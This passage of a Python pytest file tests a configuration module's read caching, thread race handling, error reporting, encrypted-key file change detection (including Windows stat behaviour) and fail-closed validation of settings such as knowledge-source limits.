        keys = [config.load_config().get("providers", {}).get("anthropic", {}).get("api_key") for _ in range(3)]
    assert keys == [None, "sk-test-not-a-real-key", "sk-test-not-a-real-key"]  # pragma: allowlist secret


def test_a_gate_reads_the_current_files_even_inside_another_decision(config_home):
    import os

    from maverick import config

    home, reads = config_home
    with config.single_read():  # a page render
        assert config.load_config()["budget"]["max_dollars"] == 5.0
        replacement = home / "config.toml.new"
        replacement.write_text("[budget]\nmax_dollars = 7.25\n", encoding="utf-8")  # a new size
        os.replace(replacement, home / "config.toml")
        assert config.load_config()["budget"]["max_dollars"] == 5.0  # the render's own read
        with config.single_read(fresh=True):  # a gate inside it
            assert config.load_config()["budget"]["max_dollars"] == 7.25
            with config.single_read(fresh=True), config.single_read():  # parts of that gate
                assert config.load_config()["budget"]["max_dollars"] == 7.25
    assert len(reads) == 2


def test_a_reset_inside_a_decision_reads_again(config_home):
    from maverick import config

    home, reads = config_home
    with config.single_read():
        config.load_config()
        (home / "config.toml").write_text("[budget\n", encoding="utf-8")
        config.reset_config_cache()
        assert config.load_config().get("budget") is None
        assert str(home / "config.toml") in config.config_source_errors()
        config.load_config()
    assert len(reads) == 3  # the read that found the corrupt file is not kept


def test_a_finished_decision_is_not_shared_with_work_that_copied_it(config_home):
    import contextvars

    from maverick import config

    _, reads = config_home
    with config.single_read():
        config.load_config()
        copied = contextvars.copy_context()
    copied.run(config.load_config)
    copied.run(config.load_config)
    assert len(reads) == 3

    def nested_decision():
        with config.single_read():
            config.load_config()
            config.load_config()

    copied.run(nested_decision)
    assert len(reads) == 4


def test_a_parse_of_a_file_replaced_meanwhile_does_not_clear_the_new_files_error(config_home, monkeypatch):
    # One read parsed the old, valid file; while it ran another read found the
    # replacement corrupt. The slower read used to commit last and erase that
    # error, so health reported the corrupt policy as fine.
    import threading

    from maverick import config

    home, _ = config_home
    path = home / "config.toml"
    real = config.atomic_read_bytes
    parsed, resume = threading.Event(), threading.Event()

    def slow_first_read(target, **kwargs):
        data = real(target, **kwargs)
        if not kwargs and threading.current_thread() is not threading.main_thread():
            # Pause the parse read, not Windows' earlier content-digest read.
            parsed.set()
            resume.wait(10)
        return data

    monkeypatch.setattr(config, "atomic_read_bytes", slow_first_read)
    config.reset_config_cache()  # the reader parses rather than hitting the cache
    results = []
    reader = threading.Thread(target=lambda: results.append(config._read_toml_raw(path)))
    reader.start()
    assert parsed.wait(10)
    path.write_text("[budget\n", encoding="utf-8")  # a different size: a new file
    assert config._read_toml_raw(path) == {}
    resume.set()
    reader.join(10)
    assert results == [{"budget": {"max_dollars": 5.0}}]  # the slow read still answers
    assert str(path) in config.config_source_errors()
    assert config._read_toml_raw(path) == {}  # the cache holds the new file
    assert str(path) in config.config_source_errors()


def test_a_failed_parse_of_a_file_replaced_meanwhile_is_reported_until_the_next_read(config_home, monkeypatch):
    # The slower read found the old file corrupt and gave its caller no policy
    # from it, so the caller must see the error even though the file is now
    # fine; the next read parses the new file and clears it.
    import threading

    from maverick import config

    home, _ = config_home
    path = home / "config.toml"
    path.write_text("[budget\n", encoding="utf-8")
    real = config.atomic_read_bytes
    parsed, resume = threading.Event(), threading.Event()

    def slow_first_read(target, **kwargs):
        data = real(target, **kwargs)
        if not kwargs and threading.current_thread() is not threading.main_thread():
            # Pause the parse read, not Windows' earlier content-digest read.
            parsed.set()
            resume.wait(10)
        return data

    monkeypatch.setattr(config, "atomic_read_bytes", slow_first_read)
    config.reset_config_cache()
    results = []
    reader = threading.Thread(target=lambda: results.append(config._read_toml_raw(path)))
    reader.start()
    assert parsed.wait(10)
    path.write_text("[budget]\nmax_dollars = 4.5\n", encoding="utf-8")
    assert config._read_toml_raw(path) == {"budget": {"max_dollars": 4.5}}
    resume.set()
    reader.join(10)
    assert results == [{}]
    assert str(path) in config.config_source_errors()
    assert config._read_toml_raw(path) == {"budget": {"max_dollars": 4.5}}
    assert str(path) not in config.config_source_errors()


def test_a_failed_unseal_of_a_replaced_overlay_is_reported_until_the_next_read(config_home, monkeypatch):
    import threading

    from maverick import config

    overlay = config.dashboard_overrides_path()
    real = config._unseal_config_tree
    reached, resume = threading.Event(), threading.Event()

    def failing_slow_unseal(tree):
        if threading.current_thread() is not threading.main_thread():
            reached.set()
            resume.wait(10)
            raise ValueError("the key could not open this value")
        return real(tree)

    monkeypatch.setattr(config, "_unseal_config_tree", failing_slow_unseal)
    results = []
    reader = threading.Thread(target=lambda: results.append(config._load_config_file(overlay)))
    reader.start()
    assert reached.wait(10)
    overlay.write_text('[budget]\nmax_dollars = 3.5\n', encoding="utf-8")  # saved again, in plain text
    assert config._load_config_file(overlay) == {"budget": {"max_dollars": 3.5}}
    resume.set()
    reader.join(10)
    assert results == [{}]  # its caller got nothing from the overlay
    assert str(overlay) in config.config_source_errors()
    assert config._load_config_file(overlay) == {"budget": {"max_dollars": 3.5}}
    assert str(overlay) not in config.config_source_errors()


def test_a_file_created_while_another_read_found_it_absent_keeps_its_error(config_home, monkeypatch):
    import threading

    from maverick import config

    home, _ = config_home
    path = home / "late.toml"
    real_stat = Path.stat
    first = []

    def created_meanwhile(self, *args, **kwargs):
        if self == path and not first:
            first.append(1)
            path.write_text("[budget\n", encoding="utf-8")
            other = threading.Thread(target=config._read_toml_raw, args=(path,))
            other.start()
            other.join(10)
            assert str(path) in config._toml_errors
            raise FileNotFoundError(str(path))  # this read saw it absent
        return real_stat(self, *args, **kwargs)

    monkeypatch.setattr(Path, "stat", created_meanwhile)
    assert config._read_toml_raw(path) == {}
    assert str(path) in config._toml_errors


def test_a_replaced_overlays_error_is_not_cleared_by_unsealing_the_old_one(config_home, monkeypatch):
    import threading

    from maverick import config

    overlay = config.dashboard_overrides_path()
    real = config._unseal_config_tree
    reached, resume = threading.Event(), threading.Event()

    def slow_unseal(tree):
        if threading.current_thread() is not threading.main_thread():
            reached.set()
            resume.wait(10)
        return real(tree)

    monkeypatch.setattr(config, "_unseal_config_tree", slow_unseal)
    results = []
    reader = threading.Thread(target=lambda: results.append(config._load_config_file(overlay)))
    reader.start()
    assert reached.wait(10)
    overlay.write_text("[providers\n", encoding="utf-8")
    assert config._load_config_file(overlay) == {}
    resume.set()
    reader.join(10)
    assert results[0]["providers"]["anthropic"]["api_key"] == "sk-test-not-a-real-key"  # pragma: allowlist secret
    assert str(overlay) in config.config_source_errors()


def test_an_overlay_that_cannot_be_checked_for_permission_still_raises(config_home, monkeypatch):
    # As Path.exists() did: callers such as the workspace IP allowlist never
    # check config_source_errors() and treat the exception as "loopback only".
    from maverick import config

    overlay = config.dashboard_overrides_path()
    real_stat = Path.stat

    def denied(self, *args, **kwargs):
        if self == overlay:
            raise PermissionError("policy source is not readable")
        return real_stat(self, *args, **kwargs)

    monkeypatch.setattr(Path, "stat", denied)
    with pytest.raises(PermissionError):
        config.load_config()


def test_a_tenant_overlay_whose_folder_became_a_file_is_no_longer_reported(config_home, monkeypatch):
    import shutil

    from maverick import config

    home, _ = config_home
    config.dashboard_overrides_path().unlink()  # sealed under the key of no tenant
    monkeypatch.setenv("MAVERICK_TENANT", "acme")
    tenant = config.tenant_config_path()
    tenant.parent.mkdir(parents=True)
    tenant.write_text("[budget\n", encoding="utf-8")
    config.load_config()
    assert str(tenant) in config.config_source_errors()
    shutil.rmtree(home / "tenants")
    (home / "tenants").write_text("not a directory", encoding="utf-8")
    assert config.load_config()["budget"]["max_dollars"] == 5.0  # skipped as absent
    assert not config.config_source_errors()  # and no longer reported


def test_the_cache_keeps_errors_it_evicts_and_evicts_nothing_to_replace_an_entry(config_home, monkeypatch):
    from maverick import config

    home, _ = config_home
    monkeypatch.setattr(config, "_TOML_CACHE_MAX", 2)
    config.reset_config_cache()
    corrupt, first, second = home / "corrupt.toml", home / "first.toml", home / "second.toml"
    corrupt.write_text("[budget\n", encoding="utf-8")
    first.write_text("a = 1\n", encoding="utf-8")
    second.write_text("b = 2\n", encoding="utf-8")
    for path in (corrupt, first, second):
        config._read_toml_raw(path)
    assert str(corrupt) not in config._toml_cache
    assert str(corrupt) in config._source_errors([corrupt]), "evicting it must not hide the error"
    second.write_text("b = 22\n", encoding="utf-8")
    assert config._read_toml_raw(second) == {"b": 22}
    assert list(config._toml_cache) == [str(first), str(second)]


def test_a_reset_inside_a_gate_also_restarts_the_render_it_is_in(config_home):
    import os

    from maverick import config

    home, reads = config_home
    with config.single_read():  # a page render
        assert config.load_config()["budget"]["max_dollars"] == 5.0
        with config.single_read(fresh=True):  # a gate inside it saves new settings
            config.load_config()
            replacement = home / "config.toml.new"
            replacement.write_text("[budget]\nmax_dollars = 9.75\n", encoding="utf-8")
            os.replace(replacement, home / "config.toml")
            config.reset_config_cache()
        assert config.load_config()["budget"]["max_dollars"] == 9.75
    assert len(reads) == 3


def test_a_slower_clean_read_does_not_clear_a_newer_reads_error(config_home, monkeypatch):
    # One read was parsing the file when another could not open it (an
    # antivirus or backup lock). The slower read finished clean and erased that
    # error, though the other read's caller got no policy from the file.
    import threading

    from maverick import config

    home, _ = config_home
    path = home / "config.toml"
    real = config.atomic_read_bytes
    parsed, resume = threading.Event(), threading.Event()

    def locked_or_slow(target, **kwargs):
        if threading.current_thread() is threading.main_thread():
            raise PermissionError("the file is locked by another program")
        data = real(target, **kwargs)
        if not kwargs:
            parsed.set()
            resume.wait(10)
        return data

    monkeypatch.setattr(config, "atomic_read_bytes", locked_or_slow)
    config.reset_config_cache()
    results = []
    reader = threading.Thread(target=lambda: results.append(config._read_toml_raw(path)))
    reader.start()
    assert parsed.wait(10)
    assert config._read_toml_raw(path) == {}
    resume.set()
    reader.join(10)
    assert results == [{"budget": {"max_dollars": 5.0}}]
    assert "PermissionError" in config.config_source_errors()[str(path)]
    monkeypatch.setattr(config, "atomic_read_bytes", real)
    assert config._read_toml_raw(path) == {"budget": {"max_dollars": 5.0}}  # the next read settles it
    assert str(path) not in config.config_source_errors()


def test_a_slower_unseal_does_not_clear_a_newer_unseal_failure(config_home, monkeypatch):
    import threading

    from maverick import config

    overlay = config.dashboard_overrides_path()
    real = config._unseal_config_tree
    reached, resume = threading.Event(), threading.Event()
    broken = [True]

    def slow_or_failing(tree):
        if threading.current_thread() is not threading.main_thread():
            reached.set()
            resume.wait(10)
            return real(tree)
        if broken[0]:
            raise ValueError("the key file can no longer be read")
        return real(tree)

    monkeypatch.setattr(config, "_unseal_config_tree", slow_or_failing)
    config._read_toml_raw(overlay)  # cached, so both reads open the same tree
    results = []
    reader = threading.Thread(target=lambda: results.append(config._load_config_file(overlay)))
    reader.start()
    assert reached.wait(10)
    assert config._load_config_file(overlay) == {}
    resume.set()
    reader.join(10)
    assert results[0]["providers"]["anthropic"]["api_key"] == "sk-test-not-a-real-key"  # pragma: allowlist secret
    assert str(overlay) in config.config_source_errors()
    broken[0] = False
    config._load_config_file(overlay)  # the next read settles it
    assert str(overlay) not in config.config_source_errors()


def test_a_clean_parse_does_not_clear_an_overlay_that_still_cannot_be_opened(config_home, monkeypatch):
    # The overlay parses fine, but its values cannot be decrypted. Parsing it
    # again (a touched file, a cache eviction) cleared that error before the
    # values were tried again.
    import os

    from maverick import config

    overlay = config.dashboard_overrides_path()
    real = config._unseal_config_tree
    broken = [True]

    def failing(tree):
        if broken[0]:
            raise ValueError("the key could not open this value")
        return real(tree)

    monkeypatch.setattr(config, "_unseal_config_tree", failing)
    assert config._load_config_file(overlay) == {}
    assert str(overlay) in config.config_source_errors()
    stat = overlay.stat()
    os.utime(overlay, ns=(stat.st_atime_ns, stat.st_mtime_ns + 1_000_000_000))
    assert "providers" in config._read_toml_raw(overlay)  # a clean parse of the same values
    assert str(overlay) in config.config_source_errors()
    broken[0] = False
    assert "providers" in config._load_config_file(overlay)
    assert str(overlay) not in config.config_source_errors()


def test_a_reset_inside_a_gate_keeps_the_renders_own_errors(config_home):
    from maverick import config

    home, _ = config_home
    path = str(home / "config.toml")
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    with config.single_read():  # a page render that met the corrupt file
        assert config.load_config().get("budget") is None
        with config.single_read(fresh=True):  # a gate inside it resets the cache
            config.reset_config_cache()
        assert path in config.config_source_errors(), "the render got no policy from it"


def test_no_file_is_checked_while_the_cache_lock_is_held(config_home, monkeypatch):
    # A slow check of one file (a network share) held the lock every
    # configuration read takes, stalling the whole process behind it.
    from maverick import config

    home, _ = config_home
    real_stat = Path.stat
    held = []

    def watched(self, *args, **kwargs):
        held.append(config._toml_lock._is_owned())
        return real_stat(self, *args, **kwargs)

    monkeypatch.setattr(Path, "stat", watched)
    config.load_config()
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    config.load_config()
    config.config_source_errors()
    (home / "config.toml").unlink()
    config.load_config()
    config.config_source_errors()
    assert held and not any(held)


def _decision(config):
    with config.single_read(fresh=True):
        return config.load_config()


def test_one_request_reads_the_configuration_once_while_nothing_changes(config_home):
    # A page asked about 29 times; each read the files, resolved the at-rest
    # key and decrypted the saved secret again.
    from maverick import config

    _, reads = config_home
    with config.kept_reads():
        for _ in range(5):
            assert _decision(config)["budget"]["max_dollars"] == 5.0
            assert config.load_config()["providers"]["anthropic"]["api_key"] == "sk-test-not-a-real-key"  # pragma: allowlist secret
        first = config.load_config()
        first["budget"]["max_dollars"] = 999  # each caller has its own copy
        assert _decision(config)["budget"]["max_dollars"] == 5.0
    assert len(reads) == 1
    config.load_config()
    assert len(reads) == 2, "outside a request every read is fresh, as before"


def test_a_policy_saved_during_a_request_is_read_by_its_next_decision(config_home):
    import os

    from maverick import config

    home, reads = config_home
    with config.kept_reads():
        assert _decision(config)["budget"]["max_dollars"] == 5.0
        replacement = home / "config.toml.new"
        replacement.write_text("[budget]\nmax_dollars = 9.5\n", encoding="utf-8")
        os.replace(replacement, home / "config.toml")
        assert _decision(config)["budget"]["max_dollars"] == 9.5
        assert _decision(config)["budget"]["max_dollars"] == 9.5
    assert len(reads) == 2


def test_an_environment_change_is_read_by_the_next_decision(config_home, monkeypatch):
    from maverick import config

    home, reads = config_home
    (home / "config.toml").write_text('[models]\nsummarizer = "${MAVERICK_KEPT_MODEL}"\n', encoding="utf-8")
    monkeypatch.setenv("MAVERICK_KEPT_MODEL", "first:model")
    with config.kept_reads():
        assert _decision(config)["models"]["summarizer"] == "first:model"
        monkeypatch.setenv("MAVERICK_KEPT_MODEL", "second:model")
        assert _decision(config)["models"]["summarizer"] == "second:model"
    assert len(reads) == 2


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
def test_a_loosened_key_file_is_read_by_the_next_decision(config_home):
    from maverick import config, crypto_at_rest

    _, reads = config_home
    with config.kept_reads():
        _decision(config)
        with crypto_at_rest.deployment_key_scope():
            key = crypto_at_rest._key_path()
        key.chmod(0o644)
        _decision(config)  # reads again, and the read makes the key private again
        assert len(reads) == 2
        assert key.stat().st_mode & 0o077 == 0
        key.parent.chmod(0o755)
        _decision(config)
        assert len(reads) == 3


def test_a_new_rotation_key_is_read_by_the_next_decision(config_home):
    from maverick import config, crypto_at_rest

    _, reads = config_home
    with config.kept_reads():
        _decision(config)
        with crypto_at_rest.deployment_key_scope():
            keyring = crypto_at_rest._keyring_dir()
        keyring.mkdir(parents=True, exist_ok=True)
        _decision(config)
        (keyring / "0011223344556677.key").write_text("00" * 32, encoding="utf-8")
        _decision(config)
    assert len(reads) == 3


def test_a_kept_read_is_used_for_two_seconds_at_most(config_home, monkeypatch):
    # A Windows ACL change on the key folder does not show in its file facts.
    from maverick import config

    _, reads = config_home
    now = [1000.0]
    monkeypatch.setattr(config, "_monotonic", lambda: now[0])
    with config.kept_reads():
        _decision(config)
        now[0] += 1.9
        _decision(config)
        assert len(reads) == 1
        now[0] += 0.2
        _decision(config)
    assert len(reads) == 2


def test_a_read_that_met_an_error_is_not_kept(config_home):
    from maverick import config

    home, reads = config_home
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    with config.kept_reads():
        for _ in range(3):
            _decision(config)
            config.load_config()
            assert str(home / "config.toml") in config.config_source_errors()
    assert len(reads) == 6


def test_a_reset_or_a_copied_worker_reads_for_itself(config_home):
    import contextvars

    from maverick import config

    _, reads = config_home
    with config.kept_reads():
        _decision(config)
        config.reset_config_cache()  # a settings save
        _decision(config)
        assert len(reads) == 2
        worker = contextvars.copy_context()
        worker.run(config.discard_kept_reads)
        worker.run(config.load_config)
        assert len(reads) == 3
        _decision(config)  # the request itself still has its read
        assert len(reads) == 3


def test_a_key_folder_that_cannot_be_named_is_not_kept_and_still_fails_soft(config_home, monkeypatch):
    from maverick import config, crypto_at_rest

    _, reads = config_home
    config.dashboard_overrides_path().unlink()  # the read itself needs no key

    def unnamed():
        raise RuntimeError("the client binding is invalid")

    monkeypatch.setattr(crypto_at_rest, "_key_path", unnamed)
    with config.kept_reads():
        for _ in range(2):
            assert _decision(config)["budget"]["max_dollars"] == 5.0  # no exception
    assert len(reads) == 2


@pytest.mark.skipif(os.name == "nt", reason="POSIX links")
def test_a_link_put_in_place_of_the_key_is_read_by_the_next_decision(config_home, tmp_path_factory):
    # A read refuses a hard-linked key file or a key folder replaced by a
    # link; a kept read must not keep opening the secrets past that.
    import os

    from maverick import config, crypto_at_rest

    home, reads = config_home
    with crypto_at_rest.deployment_key_scope():
        key = crypto_at_rest._key_path()
    elsewhere = tmp_path_factory.mktemp("elsewhere")
    with config.kept_reads():
        _decision(config)
        os.link(key, elsewhere / "copy.key")
        assert "providers" not in _decision(config)
        assert str(config.dashboard_overrides_path()) in config.config_source_errors()
        (elsewhere / "copy.key").unlink()
        assert "providers" in _decision(config)
        os.rename(key.parent, home / "keys-real")
        os.symlink(home / "keys-real", key.parent)
        assert "providers" not in _decision(config)
    assert len(reads) == 4


def test_a_key_rewritten_in_place_with_its_time_restored_is_read_again(config_home):
    import os

    from maverick import config, crypto_at_rest

    _, reads = config_home
    with crypto_at_rest.deployment_key_scope():
        key = crypto_at_rest._key_path()
    with config.kept_reads():
        assert "providers" in _decision(config)
        before = key.stat()
        key.write_text("ab" * 32, encoding="utf-8")  # another key, the same size
        os.utime(key, ns=(before.st_atime_ns, before.st_mtime_ns))
        assert "providers" not in _decision(config)  # the saved secret no longer opens
    assert len(reads) == 2


def _windows_stat_without_change_time(monkeypatch, home):
    """Report the stat results under ``home`` as Windows does: st_ctime is the
    creation time, which an in-place rewrite leaves alone, so a rewrite that
    restores the modification time and keeps the size shows no change at all."""
    import os

    from maverick import config

    def without_change_time(real):
        def stat_result(path, *args, **kwargs):
            st = real(path, *args, **kwargs)
            if not str(path).startswith(str(home)):
                return st
            # Keep native reparse-point/file attributes used by key-file checks;
            # reconstructing only POSIX fields gives them None on Windows.
            attributes = {name: getattr(st, name) for name in dir(st)
                          if name.startswith("st_")}
            attributes.update(st_ctime=0.0, st_ctime_ns=0)
            return os.stat_result((*st[:9], 0), attributes)
        return stat_result

    monkeypatch.setattr(os, "stat", without_change_time(os.stat))
    monkeypatch.setattr(os, "lstat", without_change_time(os.lstat))
    monkeypatch.setattr(config, "_CTIME_IS_CHANGE_TIME", False)


def test_a_key_rewritten_in_place_on_windows_is_read_again_though_stat_shows_no_change(config_home, monkeypatch):
    import os

    from maverick import config, crypto_at_rest

    home, reads = config_home
    _windows_stat_without_change_time(monkeypatch, home)
    with crypto_at_rest.deployment_key_scope():
        key = crypto_at_rest._key_path()
    with config.kept_reads():
        assert "providers" in _decision(config)
        before = os.stat(key)  # os.stat, not Path.stat: Python 3.10's pathlib binds it early
        key.write_text("ab" * 32, encoding="utf-8")  # another key, the same size
        os.utime(key, ns=(before.st_atime_ns, before.st_mtime_ns))
        after = os.stat(key)
        assert (after.st_size, after.st_mtime_ns, after.st_ctime_ns) == (
            before.st_size, before.st_mtime_ns, before.st_ctime_ns)
        assert "providers" not in _decision(config)  # the saved secret no longer opens
    assert len(reads) == 2


def test_a_config_rewritten_in_place_on_windows_is_read_again_though_stat_shows_no_change(config_home, monkeypatch):
    import os

    from maverick import config

    home, _ = config_home
    _windows_stat_without_change_time(monkeypatch, home)
    path = config.config_path()
    assert _decision(config)["budget"]["max_dollars"] == 5.0
    before = path.stat()
    path.write_text("[budget]\nmax_dollars = 9.0\n", encoding="utf-8")  # the same size
    os.utime(path, ns=(before.st_atime_ns, before.st_mtime_ns))
    assert _decision(config)["budget"]["max_dollars"] == 9.0


def test_a_wizard_env_file_rewritten_in_place_on_windows_is_loaded_again(tmp_path, monkeypatch):
    import os

    from maverick import config

    _windows_stat_without_change_time(monkeypatch, tmp_path)
    name = "MAVERICK_TEST_ENV_REWRITE_IN_PLACE"
    monkeypatch.setenv(name, "seed")  # so monkeypatch removes what the load exports
    monkeypatch.delenv(name)
    env = tmp_path / ".env"
    env.write_text(f"{name}=first\n", encoding="utf-8")
    config.reset_config_cache()
    config._load_env_file(env)
    assert os.environ[name] == "first"
    before = env.stat()
    os.environ.pop(name)
    env.write_text(f"{name}=other\n", encoding="utf-8")  # the same size
    os.utime(env, ns=(before.st_atime_ns, before.st_mtime_ns))
    config._load_env_file(env)
    assert os.environ[name] == "other"


def test_a_key_whose_content_cannot_be_read_is_read_again_not_kept(config_home, monkeypatch):
    # A digest read that is denied states no content. Two such statements must
    # not count as the same file, or a key rewritten in place between the two
    # decisions keeps opening the saved secret from the kept read.
    import os

    from maverick import config, crypto_at_rest

    home, _ = config_home
    _windows_stat_without_change_time(monkeypatch, home)
    with crypto_at_rest.deployment_key_scope():
        key = crypto_at_rest._key_path()
    real_read = config.atomic_read_bytes

    def denied_for_the_key(path, **kwargs):
        if str(path) == str(key):
            raise PermissionError(13, "The process cannot access the file", str(path))
        return real_read(path, **kwargs)

    monkeypatch.setattr(config, "atomic_read_bytes", denied_for_the_key)
    with config.kept_reads():
        assert "providers" in _decision(config)
        before = os.stat(key)
        key.write_text("ab" * 32, encoding="utf-8")
        os.utime(key, ns=(before.st_atime_ns, before.st_mtime_ns))
        assert "providers" not in _decision(config)  # the saved secret no longer opens


def test_a_config_whose_content_cannot_be_read_is_parsed_again(config_home, monkeypatch):
    import os

    from maverick import config

    home, _ = config_home
    _windows_stat_without_change_time(monkeypatch, home)
    path = config.config_path()
    real_digest = config._content_digest
    monkeypatch.setattr(
        config, "_content_digest",
        lambda p, st: None if str(p) == str(path) else real_digest(p, st))
    assert _decision(config)["budget"]["max_dollars"] == 5.0
    before = path.stat()
    path.write_text("[budget]\nmax_dollars = 9.0\n", encoding="utf-8")  # the same size
    os.utime(path, ns=(before.st_atime_ns, before.st_mtime_ns))
    assert _decision(config)["budget"]["max_dollars"] == 9.0


def test_a_wizard_env_file_whose_content_cannot_be_read_is_loaded_again(tmp_path, monkeypatch):
    import os

    from maverick import config

    _windows_stat_without_change_time(monkeypatch, tmp_path)
    env = tmp_path / ".env"
    real_digest = config._content_digest
    monkeypatch.setattr(
        config, "_content_digest",
        lambda p, st: None if str(p) == str(env) else real_digest(p, st))
    name = "MAVERICK_TEST_ENV_UNREADABLE_DIGEST"
    monkeypatch.setenv(name, "seed")  # so monkeypatch removes what the load exports
    monkeypatch.delenv(name)
    env.write_text(f"{name}=first\n", encoding="utf-8")
    config.reset_config_cache()
    config._load_env_file(env)
    assert os.environ[name] == "first"
    before = env.stat()
    os.environ.pop(name)
    env.write_text(f"{name}=other\n", encoding="utf-8")  # the same size
    os.utime(env, ns=(before.st_atime_ns, before.st_mtime_ns))
    config._load_env_file(env)
    assert os.environ[name] == "other"


def test_content_digest_reads_nothing_on_posix_and_a_denied_read_does_not_retry(tmp_path, monkeypatch):
    # The digest is the hot-path cost only where stat cannot show a rewrite:
    # POSIX reads no file, and a denied Windows read is reported at once.
    from maverick import config

    path = tmp_path / "config.toml"
    path.write_text("[budget]\nmax_dollars = 5.0\n", encoding="utf-8")
    st = path.stat()
    reads = []

    def denied(p, **kwargs):
        reads.append(kwargs)
        raise PermissionError(13, "The process cannot access the file", str(p))

    monkeypatch.setattr(config, "atomic_read_bytes", denied)
    monkeypatch.setattr(config, "_CTIME_IS_CHANGE_TIME", True)
    assert config._content_digest(path, st) == b""
    assert reads == []
    monkeypatch.setattr(config, "_CTIME_IS_CHANGE_TIME", False)
    assert config._content_digest(path, st) is None
    assert reads == [{"retry_seconds": 0.0}]


def _knowledge_sources_section(monkeypatch, section):
    monkeypatch.setattr(config_module, "load_config", lambda: {"knowledge_sources": section})


def test_knowledge_sources_defaults_keep_the_historical_bounds(monkeypatch):
    _knowledge_sources_section(monkeypatch, {})
    assert config_module.get_knowledge_sources() == {
        "max_items": 64, "max_pages": 16, "max_download_mib": 4, "max_text_kib": 256,
        "max_refresh_minutes": 5, "permission_filter": "off",
    }


@pytest.mark.parametrize("value", ["off", "by_email"])
def test_knowledge_sources_permission_filter_accepts_its_two_modes(monkeypatch, value):
    _knowledge_sources_section(monkeypatch, {"permission_filter": value})
    assert config_module.get_knowledge_sources()["permission_filter"] == value


@pytest.mark.parametrize("value", ["on", "by_group", "", True, None, 1])
def test_an_unknown_knowledge_sources_permission_filter_fails_closed_with_a_named_error(monkeypatch, value):
    _knowledge_sources_section(monkeypatch, {"permission_filter": value})
    with pytest.raises(config_module.KnowledgeSourcesConfigError,
                       match=r'^knowledge_sources\.permission_filter must be "off" or "by_email"$'):
        config_module.get_knowledge_sources()


@pytest.mark.parametrize(("key", "low", "high"), [
    ("max_items", 1, 1000), ("max_pages", 1, 200), ("max_download_mib", 1, 32), ("max_text_kib", 1, 8192),
    ("max_refresh_minutes", 1, 60),
])
def test_knowledge_sources_limits_accept_their_documented_range(monkeypatch, key, low, high):
    for value in (low, high):
        _knowledge_sources_section(monkeypatch, {key: value})
        assert config_module.get_knowledge_sources()[key] == value


@pytest.mark.parametrize(("key", "value"), [
    ("max_items", 0), ("max_items", 1001), ("max_items", True), ("max_items", "64"), ("max_items", 64.0),
    ("max_pages", 0), ("max_pages", 201), ("max_download_mib", 33), ("max_download_mib", -1),
    ("max_text_kib", 8193), ("max_text_kib", None),
    ("max_refresh_minutes", 0), ("max_refresh_minutes", 61), ("max_refresh_minutes", 5.0),
])
def test_out_of_range_knowledge_sources_limits_fail_closed_with_a_named_error(monkeypatch, key, value):
    _knowledge_sources_section(monkeypatch, {key: value})
    with pytest.raises(config_module.KnowledgeSourcesConfigError, match=rf"^knowledge_sources\.{key} must be a whole number"):
        config_module.get_knowledge_sources()


def test_a_knowledge_sources_table_that_is_not_a_table_fails_closed(monkeypatch):
    monkeypatch.setattr(config_module, "load_config", lambda: {"knowledge_sources": "64"})
    with pytest.raises(config_module.KnowledgeSourcesConfigError, match="knowledge_sources must be a table"):
        config_module.get_knowledge_sources()


def test_string_switches_parse_as_booleans_not_truthiness(monkeypatch):
    monkeypatch.setattr(config_module, "load_config", lambda *a, **k: {
        "capabilities": {"code_exec": "false", "computer_use": "no"},
        "autonomy": {"enable": "off"},
        "skills": {"require_signed": "maybe"},
    })
    caps = config_module.get_capabilities()
    assert caps["code_exec"] is False and caps["computer_use"] is False
    assert config_module.get_autonomy()["enable"] is False
    # An unrecognized value on a protective switch keeps the protection on.
    assert config_module.get_skills()["require_signed"] is True


def test_malformed_dashboard_reset_metadata_is_a_source_error_not_a_crash(tmp_path, monkeypatch):
    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path))
    monkeypatch.setenv("MAVERICK_CONFIG", str(tmp_path / "config.toml"))
    monkeypatch.delenv("MAVERICK_TENANT", raising=False)
    config_module.reset_config_cache()
    (tmp_path / "config.toml").write_text('[auth.local_owner]\ntotp = "required"\n', encoding="utf-8")
    overlay = config_module.dashboard_overrides_path()
    overlay.write_text("_dashboard_resets = 1\n", encoding="utf-8")
    try:
        assert load_config()["auth"]["local_owner"]["totp"] == "required"
        assert str(overlay) in config_module.config_source_errors()
        overlay.write_text("[budget]\nmax_dollars = 2.0\n", encoding="utf-8")
        assert load_config()["budget"]["max_dollars"] == 2.0
        assert config_module.config_source_errors() == {}
    finally:
        config_module.reset_config_cache()


def test_infinite_numbers_fall_back_instead_of_raising_or_lifting_caps(monkeypatch):
    monkeypatch.delenv("MAVERICK_PROVIDER_TEST_RECEIPT_MAX_AGE_DAYS", raising=False)
    inf = float("inf")
    monkeypatch.setattr(config_module, "load_global_config", lambda: {
        "providers": {"test_receipt_max_age_days": inf}})
    assert config_module.provider_test_receipt_max_age_days() == 30
    monkeypatch.setattr(config_module, "load_config", lambda *a, **k: {
        "commerce": {"max_session_spend": inf}, "repl": {"max_seconds": inf}})
    assert config_module.get_commerce()["max_session_spend"] == 500.0
    assert config_module.get_repl()["max_seconds"] == 30.0


def test_a_rotated_or_removed_wizard_env_value_reaches_the_running_process(tmp_path, monkeypatch):
    import os

    name = "MAVERICK_TEST_ENV_ROTATION"
    monkeypatch.setenv(name, "seed")  # so monkeypatch removes what the load exports
    monkeypatch.delenv(name)
    env = tmp_path / ".env"
    env.write_text(f"{name}=first\n", encoding="utf-8")
    config_module.reset_config_cache()
    config_module._load_env_file(env)
    assert os.environ[name] == "first"
    env.write_text(f"{name}=second-rotated\n", encoding="utf-8")
    config_module._load_env_file(env)
    assert os.environ[name] == "second-rotated"
    env.write_text("\n", encoding="utf-8")
    config_module._load_env_file(env)
    assert name not in os.environ
